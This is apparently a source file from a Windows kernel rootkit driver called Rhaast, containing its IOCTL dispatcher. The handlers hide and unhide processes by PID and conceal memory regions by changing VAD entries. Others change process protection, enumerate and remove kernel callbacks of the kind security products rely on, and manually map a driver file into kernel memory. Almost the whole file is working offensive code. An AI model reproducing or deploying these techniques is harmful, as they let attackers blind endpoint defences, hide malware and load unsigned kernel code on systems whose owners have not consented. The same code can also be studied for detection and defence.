#include <Rhaast.h>

/**
 * @brief
 *      used to handle IRP_MJ_CREATE/IRP_MJ_CLOSE requests
 */
NTSTATUS TsIoCtlCreateClose(
    _In_ _Out_ PDEVICE_OBJECT DriverObject,
    _In_ _Out_ PIRP           Irp
) {
    UNREFERENCED_PARAMETER( DriverObject );

    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    PUTS( "open/close request has been made" )

    IofCompleteRequest( Irp, IO_NO_INCREMENT );

    return STATUS_SUCCESS;
}

/**
 * @brief
 *      initialize IoCtl transport functions
 *      and create I/O Device & symbol link
 *
 * @return
 *      NtStatus of function and it's operations
 */
NTSTATUS TsIoCtlInit(
    VOID
) {
    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING( RHAAST_DEVICE_NAME );
    UNICODE_STRING SymbolLink = RTL_CONSTANT_STRING( RHAAST_SYMBOL_LINK );
    NTSTATUS       NtStatus   = STATUS_SUCCESS;

    /* set pointers */
    Instance.DriverObject->MajorFunction[ IRP_MJ_CREATE ]         = 
    Instance.DriverObject->MajorFunction[ IRP_MJ_CLOSE  ]         = TsIoCtlCreateClose;
    Instance.DriverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL ] = TsIoCtlDispatch;

    /* create I/O Device */
    if ( ! NT_SUCCESS( NtStatus = IoCreateDevice( Instance.DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &Instance.DeviceObject ) ) ) {
        PRINTF( "IoCreateDevice Failed: %p\n", NtStatus )
        goto FAILED;
    }

    /* create symbol link */
    if ( ! NT_SUCCESS( NtStatus = IoCreateSymbolicLink( &SymbolLink, &DeviceName ) ) ) {
        PRINTF( "IoCreateSymbolicLink Failed: %p\n", NtStatus )
        goto FAILED;
    }

    /* we successful executed the function */
    return STATUS_SUCCESS;

FAILED:
    if ( Instance.DeviceObject ) {
        IoDeleteDevice( Instance.DeviceObject );
        Instance.DeviceObject = NULL;
    }

    return NtStatus;
}

/**
 * @brief
 *      Responsible for handling & dispatch IOCTLs 
 *      and returning output to the user.
 *
 * @param DeviceObject
 *      Not used
 *
 * @param Irp
 *      Irp contains the data issued by the client
 *
 * @return
 *      if the function succeeded to execute
 */
NTSTATUS TsIoCtlDispatch(
    _In_ _Out_ PDEVICE_OBJECT DeviceObject,
    _In_ _Out_ PIRP           Irp
) {
    PIO_STACK_LOCATION IrpStack = NULL;
    NTSTATUS           NtStatus = STATUS_SUCCESS;
    ULONG              Length   = 0;

    /* get current irp stack */
    IrpStack = IoGetCurrentIrpStackLocation( Irp ); 

    /* dispatch IOCTL code */
    switch ( IrpStack->Parameters.DeviceIoControl.IoControlCode ) {

        case RHAAST_IOCTL_PROCESS_HIDE: PUTS( "RHAAST_IOCTL_PROCESS_HIDE" )
        {
            ULONG Pid = 0;

            /* check if param has been specified */
            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }
            
            /* get process id & hide process */
            if ( Irp->AssociatedIrp.SystemBuffer ) {
                Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;

                /* hide process */
                if ( ! NT_SUCCESS( NtStatus = ProcessHide( Pid ) ) ) {
                    PRINTF( "Failed to hide process: %p\n", NtStatus )
                    break;
                }
                
                PRINTF( "Process Hidden: %d\n", Pid )
            } else {
                NtStatus = STATUS_INVALID_PARAMETER;
            }

            Length += sizeof( ULONG );

            break;
        }

        case RHAAST_IOCTL_PROCESS_UNHIDE: PUTS( "RHAAST_IOCTL_PROCESS_UNHIDE" )
        {
            ULONG Pid = 0;

            /* check if param has been specified */
            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* get process id & unhide process */
            if ( Irp->AssociatedIrp.SystemBuffer ) {
                Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;

                /* unhide process */
                if ( ! NT_SUCCESS( NtStatus = ProcessUnHide( Pid ) ) ) {
                    PRINTF( "Failed to unhide process: %p\n", NtStatus )
                    break;
                }
                
                PRINTF( "Process UnHidden: %d\n", Pid )
            } else {
                NtStatus = STATUS_INVALID_PARAMETER;
            }

            Length += sizeof( ULONG );

            break;
        }

        case RHAAST_IOCTL_MEMORY_VAD: PUTS( "RHAAST_IOCTL_MEMORY_VAD" )
        {
            PRS_C_MEMORY_VAD MemoryVad = NULL;

            /* check if param has been specified */
            if ( ! ( MemoryVad = Irp->AssociatedIrp.SystemBuffer ) ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_MEMORY_VAD ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* hide memory by manipulating the VAD entry of virtual address */
            if ( ! NT_SUCCESS( NtStatus = MemoryVadHide( MemoryVad->Pid, MemoryVad->Address ) ) ) {
                PRINTF( "Failed to hide VAD: Pid:[%ld] Address:[%p] Status:[%p]\n", MemoryVad->Pid, MemoryVad->Address, NtStatus )
                break;
            }

            Length += sizeof( RS_C_MEMORY_VAD );

            break;
        }

        case RHAAST_IOCTL_PROCESS_PROTECT : PUTS( "RHAAST_IOCTL_PROCESS_PROTECT" )
        {
            PRS_C_PROCESS_PROTECTION Protection = NULL;

            /* check if param has been specified */
            if ( ! ( Protection = Irp->AssociatedIrp.SystemBuffer ) ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_PROCESS_PROTECTION ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* apply/remove protection on the specified process */
            if ( ! NT_SUCCESS( NtStatus = ProcessProtect( Protection ) ) ) {
                PRINTF( "Failed to protect process: %p\n", NtStatus )
                break;
            }

            Length += sizeof( RS_C_PROCESS_PROTECTION );

            break; 
        }

        case RHAAST_IOCTL_CALLBACK_QUERY: PUTS( "RHAAST_IOCTL_CALLBACK_QUERY" )
        {
            PRS_C_CALLBACK_QUERY CallbackQuery = NULL;
            PRS_CALLBACK_DATA    CallbackData  = NULL;
            ULONG                Size          = 0;

            /* check if param has been specified */
            if ( ! ( CallbackQuery = Irp->AssociatedIrp.SystemBuffer ) ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_CALLBACK_QUERY ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            if ( ! CallbackQuery->Size )
            {
                /* only query size for now */
                if ( ! NT_SUCCESS( NtStatus = RsCallbackQuery( CallbackQuery->Type, NULL, &CallbackQuery->Size ) ) ) {
                    PRINTF( "Failed to query callbacks Type:[%d] Size:[%d]: %p\n", CallbackQuery->Type, CallbackQuery->Size, NtStatus )
                    break; 
                }
                
                Length += sizeof( RS_C_CALLBACK_QUERY );
            }
            else 
            {
                /* allocate memory for callback list */
                if ( ! ( CallbackData = RsMemAlloc( CallbackQuery->Size ) ) ) {
                    PUTS( "Failed to allocate memory for CallbackData" )
                    NtStatus = STATUS_INSUFFICIENT_RESOURCES;
                    goto CB_QUERY_END;
                }

                /* query callback list */
                if ( ! NT_SUCCESS( NtStatus = RsCallbackQuery( CallbackQuery->Type, CallbackData, &Size ) ) ) {
                    PRINTF( "Failed to query callbacks Type:[%d] Size:[%d]: %p\n", CallbackQuery->Type, CallbackQuery->Size, NtStatus )
                    goto CB_QUERY_END;
                }
                
                if ( CallbackQuery->Size != Size ) {
                    PRINTF( "Query Size:[%d] != Size:[%d]\n", CallbackQuery->Size, Size )
                    NtStatus = STATUS_INFO_LENGTH_MISMATCH;
                    goto CB_QUERY_END;
                }
                
                /* copy over the  */
                RtlCopyMemory( Irp->AssociatedIrp.SystemBuffer, CallbackData, Size );
                Length += Size;

            CB_QUERY_END:
                if ( CallbackData ) {
                    RsMemFree( CallbackData );
                    CallbackData = NULL;
                }
            }

            break; 
        }

        case RHAAST_IOCTL_CALLBACK_REMOVE: PUTS( "RHAAST_IOCTL_CALLBACK_REMOVE" )
        {
            PRS_C_CALLBACK_REMOVE Remove = NULL;
            RS_CALLBACK_DATA      Data   = { 0 };

            RtlSecureZeroMemory( &Data, sizeof( Data ) );

            /* check if param has been specified */
            if ( ! ( Remove = Irp->AssociatedIrp.SystemBuffer ) ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_CALLBACK_REMOVE ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }
            
            /* remove specified callback */
            if ( ! NT_SUCCESS( NtStatus = RsCallbackRemove( Remove->Type, Remove->Callback ) ) ) {
                PRINTF( "Failed to remove callback: Type:[%d] Callback:[%p] NtStatus:[%p]\n", Remove->Type, Remove->Callback, NtStatus )
                break;
            }

            /* query driver name & base from callback address */
            if ( ! NT_SUCCESS( NtStatus = RsDrvNameBaseFromAddr( C_PTR( Remove->Callback ), ( PCHAR* ) & Data.DriverName, ( PVOID ) & Data.DriverBase ) ) ) {
                PRINTF( "RsDrvNameBaseFromAddr Failed: %p\n", NtStatus )
            }

            Data.Type     = Remove->Type;
            Data.Callback = Remove->Callback;

            /* copy over collected data */
            RtlCopyMemory( Irp->AssociatedIrp.SystemBuffer, &Data, sizeof( Data ) );

            /* clear struct from stack */
            RtlSecureZeroMemory( &Data, sizeof( Data ) );

            Length += sizeof( RS_CALLBACK_DATA );

            break; 
        }

        case RHAAST_IOCTL_DRIVER_LOAD: PUTS( "RHAAST_IOCTL_DRIVER_LOAD" )
        {
            PRS_C_DRIVER_LOAD DriverLoad = NULL;
            PVOID             DriverAddr = NULL;
            SIZE_T            DriverSize = 0;

            /* check if param has been specified */
            if ( ! ( DriverLoad = Irp->AssociatedIrp.SystemBuffer ) ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_DRIVER_LOAD ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* first get required size for the driver to allocate */
            if ( NT_SUCCESS( NtStatus = RsReadFile( DriverLoad->DriverPath, NULL, &DriverSize ) ) ) {

                /* allocate driver buffer */
                if ( ! ( DriverAddr = RsMemAlloc( DriverSize ) ) ) {
                    NtStatus = STATUS_INSUFFICIENT_RESOURCES;
                    break; 
                }
                
                /* read file into buffer */
                if ( NT_SUCCESS( NtStatus = RsReadFile( DriverLoad->DriverPath, DriverAddr, &DriverSize ) ) ) {

                    /* map driver into memory */
                    NtStatus = RsMapDriver( DriverAddr, ( PVOID ) & DriverLoad->DriverBase );

                }
            }
            
            Length             += sizeof( RS_C_DRIVER_LOAD );
            DriverLoad->Status =  NtStatus;

            /* free memory */
            if ( DriverAddr ) {
                RtlSecureZeroMemory( DriverAddr, DriverSize );
                RsMemFree( DriverAddr );
                DriverAddr = NULL;
            }

            break; 
        }

        default: {
            NtStatus = STATUS_INVALID_DEVICE_REQUEST;
            Length   = 0;
        }
    }

    /* set Irp request info */
    Irp->IoStatus.Status      = NtStatus;
    Irp->IoStatus.Information = Length;

    /* set complete */
    IoCompleteRequest( Irp, IO_NO_INCREMENT );

    return NtStatus;
}
